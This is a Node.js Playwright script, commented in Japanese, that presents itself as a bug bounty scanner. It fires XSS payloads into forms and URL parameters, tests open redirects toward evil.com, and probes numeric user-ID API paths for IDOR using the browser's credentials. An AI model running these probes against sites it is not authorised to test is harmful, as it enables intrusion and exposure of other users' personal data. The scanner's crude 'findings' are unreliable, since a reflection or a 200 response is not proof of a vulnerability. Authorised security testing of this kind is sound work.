/**
 * バグバウンティ 自動スキャナー
 * HackerOneのプログラムでXSS/IDOR/オープンリダイレクトを探す
 * node scripts/bug-scan.mjs <target-url> <program-name>
 */
import { chromium } from "playwright";
import fs from "fs";
import path from "path";

const LOG = (msg) => console.log(`[${new Date().toLocaleTimeString("ja-JP")}] ${msg}`);

// XSSペイロード
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '"><script>alert(1)</script>',
  "'><img src=x onerror=alert(1)>",
  '<img src=x onerror=alert(document.domain)>',
  'javascript:alert(1)',
  '{{7*7}}',  // テンプレートインジェクション
];

// Open Redirect ペイロード
const REDIRECT_PAYLOADS = [
  'https://evil.com',
  '//evil.com',
  'https://evil.com%09',
];

const findings = [];

function addFinding(type, severity, url, param, payload, evidence) {
  const f = { type, severity, url, param, payload, evidence, found_at: new Date().toISOString() };
  findings.push(f);
  LOG(`🚨 発見! [${severity}] ${type} @ ${url} (param: ${param})`);
  LOG(`   ペイロード: ${payload}`);
  LOG(`   証拠: ${evidence}`);
}

async function scanXSS(page, url) {
  LOG(`XSSスキャン: ${url}`);
  try {
    await page.goto(url, { waitUntil: "domcontentloaded", timeout: 15000 });
    await page.waitForTimeout(1500);

    // フォームを全部探す
    const forms = await page.locator("form").all();
    LOG(`  フォーム: ${forms.length}件`);

    for (const form of forms.slice(0, 5)) {
      const inputs = await form.locator('input[type="text"], input[type="search"], input:not([type]), textarea').all();

      for (const input of inputs.slice(0, 3)) {
        const name = await input.getAttribute("name").catch(() => "unnamed");

        for (const payload of XSS_PAYLOADS.slice(0, 3)) {
          try {
            await input.fill(payload);
            const alertFired = await page.evaluate(() => {
              return new Promise((resolve) => {
                const orig = window.alert;
                window.alert = () => { window.alert = orig; resolve(true); };
                setTimeout(() => { window.alert = orig; resolve(false); }, 500);
              });
            });

            if (alertFired) {
              addFinding("XSS", "High", url, name, payload, "alert() fired");
            }

            // DOMにペイロードが反映されたか確認
            const pageContent = await page.content();
            if (pageContent.includes(payload) && !payload.startsWith("{")) {
              addFinding("Reflected XSS (Potential)", "Medium", url, name, payload, "payload reflected in response");
            }
          } catch {}
        }
      }
    }

    // URLパラメータでのXSS
    const currentUrl = page.url();
    const urlObj = new URL(currentUrl);
    for (const [key, val] of urlObj.searchParams) {
      for (const payload of XSS_PAYLOADS.slice(0, 2)) {
        const testUrl = new URL(currentUrl);
        testUrl.searchParams.set(key, payload);
        try {
          await page.goto(testUrl.toString(), { waitUntil: "domcontentloaded", timeout: 10000 });
          const content = await page.content();
          if (content.includes(payload)) {
            addFinding("Reflected XSS (URL param)", "Medium", testUrl.toString(), key, payload, "payload in response");
          }
        } catch {}
        await page.goto(currentUrl, { waitUntil: "domcontentloaded", timeout: 10000 }).catch(() => {});
      }
    }
  } catch (e) {
    LOG(`  スキャンエラー: ${e.message?.slice(0, 50)}`);
  }
}

async function scanIDOR(page, baseUrl) {
  LOG(`IDORスキャン: ${baseUrl}`);
  try {
    // /api/users/1, /api/users/2 など数字IDを試す
    const idPatterns = [
      "/api/users/",
      "/api/user/",
      "/api/profile/",
      "/api/account/",
      "/user/",
      "/profile/",
      "/account/",
    ];

    for (const pattern of idPatterns) {
      const testUrl = baseUrl.replace(/\/$/, "") + pattern;

      // ID 1, 2, 3 を試す
      for (const id of [1, 2, 3, 100]) {
        try {
          const res = await page.evaluate(async (url) => {
            const r = await fetch(url, { credentials: "include" });
            return { status: r.status, body: await r.text().catch(() => ""), headers: Object.fromEntries([...r.headers]) };
          }, testUrl + id);

          if (res.status === 200 && res.body.length > 10) {
            const hasUserData = /email|username|name|phone|address/i.test(res.body);
            if (hasUserData) {
              addFinding("IDOR (Potential)", "High", testUrl + id, "id", String(id),
                `Status: ${res.status}, contains user data: ${res.body.slice(0, 100)}`);
            } else {
              LOG(`  ${testUrl + id} → ${res.status} (${res.body.length} bytes)`);
            }
          }
        } catch {}
      }
    }
  } catch (e) {
    LOG(`  IDORスキャンエラー: ${e.message?.slice(0, 50)}`);
  }
}

async function scanOpenRedirect(page, baseUrl) {
  LOG(`オープンリダイレクトスキャン: ${baseUrl}`);
  const redirectParams = ["next", "redirect", "url", "return", "returnUrl", "redirect_uri", "callback", "go", "dest"];

  for (const param of redirectParams) {
    for (const payload of REDIRECT_PAYLOADS.slice(0, 2)) {
      const testUrl = `${baseUrl}?${param}=${encodeURIComponent(payload)}`;
      try {
        await page.goto(testUrl, { waitUntil: "domcontentloaded", timeout: 8000 });
        const finalUrl = page.url();
        if (finalUrl.includes("evil.com") || finalUrl.startsWith("//")) {
          addFinding("Open Redirect", "Medium", testUrl, param, payload, `Redirected to: ${finalUrl}`);
        }
      } catch {}
    }
  }
}

async function scanSecurityHeaders(page, url) {
  LOG(`セキュリティヘッダーチェック: ${url}`);
  try {
    const headers = await page.evaluate(async (url) => {
      const r = await fetch(url, { method: "HEAD" }).catch(() => fetch(url));
      return Object.fromEntries([...r.headers]);
    }, url);

    const missing = [];
    if (!headers["x-content-type-options"]) missing.push("X-Content-Type-Options");
    if (!headers["x-frame-options"] && !headers["content-security-policy"]) missing.push("X-Frame-Options");
    if (!headers["strict-transport-security"]) missing.push("HSTS");
    if (!headers["content-security-policy"]) missing.push("CSP");

    if (missing.length > 0) {
      addFinding("Missing Security Headers", "Low", url, "headers", missing.join(", "),
        `Missing: ${missing.join(", ")}`);
    }
  } catch {}
}

async function crawlLinks(page, baseUrl, depth = 1) {
  const links = await page.locator("a[href]").evaluateAll(
    (els, base) => els.map(e => {
      try { return new URL(e.href, base).href; } catch { return null; }
    }).filter(h => h && h.startsWith(base) && !h.includes("#")),
    baseUrl
  );
  return [...new Set(links)].slice(0, 20);
}

async function main() {
  const targetUrl = process.argv[2] || "https://example.com";
  const programName = process.argv[3] || "Unknown Program";

  LOG(`🔍 バグスキャン開始`);
  LOG(`ターゲット: ${targetUrl}`);
  LOG(`プログラム: ${programName}`);
  LOG(`スキャン項目: XSS, IDOR, オープンリダイレクト, セキュリティヘッダー`);
  LOG("");

  const browser = await chromium.connectOverCDP("http://localhost:9222");
  const context = browser.contexts()[0];
  const page = context.pages()[0] || await context.newPage();

  // メインページロード
  await page.goto(targetUrl, { waitUntil: "domcontentloaded", timeout: 20000 }).catch(() => {});
  await page.waitForTimeout(2000);

  // セキュリティヘッダー
  await scanSecurityHeaders(page, targetUrl);

  // XSS（メインページ）
  await scanXSS(page, targetUrl);

  // オープンリダイレクト
  await scanOpenRedirect(page, targetUrl);

  // IDOR
  await scanIDOR(page, targetUrl);

  // リンクをクロールして追加でスキャン
  LOG("\nリンクをクロール中...");
  await page.goto(targetUrl, { waitUntil: "domcontentloaded", timeout: 15000 }).catch(() => {});
  const links = await crawlLinks(page, targetUrl);
  LOG(`発見リンク: ${links.length}件`);

  for (const link of links.slice(0, 5)) {
    await scanXSS(page, link);
    await scanOpenRedirect(page, link);
  }

  // レポート生成
  LOG("\n━━━━━━ スキャン完了 ━━━━━━");
  LOG(`発見した問題: ${findings.length}件`);

  if (findings.length > 0) {
    const report = `# Bug Bounty Report
**Program:** ${programName}
**Target:** ${targetUrl}
**Date:** ${new Date().toISOString().slice(0, 10)}
**Scanner:** Bounty Hunter Auto-Scanner

## Findings (${findings.length})

${findings.map((f, i) => `### Finding ${i + 1}: ${f.type} [${f.severity}]

**URL:** ${f.url}
**Parameter:** ${f.param}
**Payload:** \`${f.payload}\`
**Evidence:** ${f.evidence}
**Found at:** ${f.found_at}

`).join("")}

## Reproduction Steps

${findings.map((f, i) => `**Finding ${i + 1}:**
1. Navigate to: ${f.url}
2. In parameter \`${f.param}\`, inject: \`${f.payload}\`
3. Observe: ${f.evidence}
`).join("\n")}

## Impact
${findings.filter(f => f.severity === "High").length} High, ${findings.filter(f => f.severity === "Medium").length} Medium, ${findings.filter(f => f.severity === "Low").length} Low severity issues found.

## Remediation
- Implement proper input validation and output encoding
- Add security headers (CSP, HSTS, X-Frame-Options)
- Implement proper authorization checks for all API endpoints
`;

    const reportPath = path.join(process.cwd(), `bug-report-${Date.now()}.md`);
    fs.writeFileSync(reportPath, report);
    LOG(`レポート保存: ${reportPath}`);

    findings.forEach((f, i) => {
      LOG(`\n[${i + 1}] ${f.type} [${f.severity}]`);
      LOG(`  URL: ${f.url}`);
      LOG(`  パラメータ: ${f.param}`);
      LOG(`  証拠: ${f.evidence}`);
    });
  } else {
    LOG("このターゲットでは自動スキャンで明らかなバグは見つからなかった");
    LOG("手動での詳細テストを推奨");
  }
}

main().catch(e => LOG(`FATAL: ${e.message}`));
